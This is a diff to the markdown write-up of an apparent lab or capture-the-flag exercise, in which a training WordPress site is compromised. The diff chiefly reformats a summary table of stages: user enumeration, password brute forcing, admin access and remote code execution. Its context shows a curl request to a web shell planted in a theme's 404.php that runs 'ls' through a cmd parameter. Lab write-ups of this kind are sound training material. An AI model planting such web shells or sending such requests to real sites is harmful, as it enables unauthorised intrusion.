@@ -126,16 +126,19 @@ I also listed files in the web server's root directory:
 ```bash
 curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=ls+/var/www/blog.inlanefreight.local/"
 ```
-Found important files that might help in further privilege escalation or lateral movement.
+Found important files that will help in further privilege escalation or lateral movement to get the flag.
 
 ![image](https://github.com/user-attachments/assets/f9ac18b9-e2cf-408a-a41d-ef5fc8fc1f31)
 
 ## Summary
-Stage | Status
-WordPress user enumeration | ✅ Completed
-Password brute forcing | ✅ Completed
-Admin panel access | ✅ Completed
-Remote Code Execution | ✅ Achieved
-Initial foothold on the server | ✅ Done
+
+| Stage                | Status        |
+|----------------------|---------------|
+| WordPress user enumeration | ✅ Completed |
+| Password brute forcing | ✅ Completed |
+| Admin panel access | ✅ Completed |
+| Remote Code Execution | ✅ Achieved |
+| Initial foothold on the server | ✅ Done |
+
 
 HAPPY HACKING !
